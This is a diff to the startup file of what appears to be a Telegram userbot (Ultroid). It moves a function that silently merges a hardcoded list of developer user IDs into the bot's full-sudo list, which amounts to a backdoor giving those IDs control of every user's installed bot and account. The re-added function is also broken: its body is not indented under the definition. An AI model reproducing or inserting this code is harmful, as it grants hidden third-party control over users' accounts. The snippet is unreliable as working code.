@@ -18,22 +18,8 @@ from telethon.errors import (
     AuthKeyDuplicatedError,
 )
 from pytgcalls import PyTgCalls
-from .dB import DEVLIST
 
 run_as_module = __package__ in sys.argv or sys.argv[0] == "-m"
-
-async def update_fullsudo_with_devlist():
-    print("🔄 [SETUP] Memuat dan menggabungkan DEVLIST ke FULLSUDO...")
-    current_full_sudo = udB.get_key("FULLSUDO") or []
-    initial_count = len(set(current_full_sudo))
-    merged_ids_set = set(current_full_sudo)
-    merged_ids_set.update(DEVLIST)
-    final_full_sudo_list = list(merged_ids_set)
-    udB.set_key("FULLSUDO", final_full_sudo_list)
-    final_count = len(final_full_sudo_list)
-    print(f"✅ [SUDO LOADED] FULLSUDO berhasil diperbarui di database.")
-    print(f"   -> DEVLIST ditambahkan (total {len(DEVLIST)} ID).")
-    print(f"   -> ID FULLSUDO di DB: {initial_count} -> {final_count}")
 
 class ULTConfig:
     lang = "en"
@@ -51,12 +37,29 @@ if run_as_module:
     from .startup.funcs import _version_changes, autobot, enable_inline, update_envs
     from .version import ultroid_version
     from telethon import __version__ as tver
-    
+    from .dB import DEVLIST
+
+
     if not os.path.exists("./plugins"):
         LOGS.error(
             "'plugins' folder not found!\nMake sure that, you are on correct path."
         )
         exit()
+
+
+    async def update_fullsudo_with_devlist():
+    print("🔄 [SETUP] Memuat dan menggabungkan DEVLIST ke FULLSUDO...")
+    current_full_sudo = udB.get_key("FULLSUDO") or []
+    initial_count = len(set(current_full_sudo))
+    merged_ids_set = set(current_full_sudo)
+    merged_ids_set.update(DEVLIST)
+    final_full_sudo_list = list(merged_ids_set)
+    udB.set_key("FULLSUDO", final_full_sudo_list)
+    final_count = len(final_full_sudo_list)
+    print(f"✅ [SUDO LOADED] FULLSUDO berhasil diperbarui di database.")
+    print(f"   -> DEVLIST ditambahkan (total {len(DEVLIST)} ID).")
+    print(f"   -> ID FULLSUDO di DB: {initial_count} -> {final_count}")
+    
 
     start_time = time.time()
     _ult_cache = {}
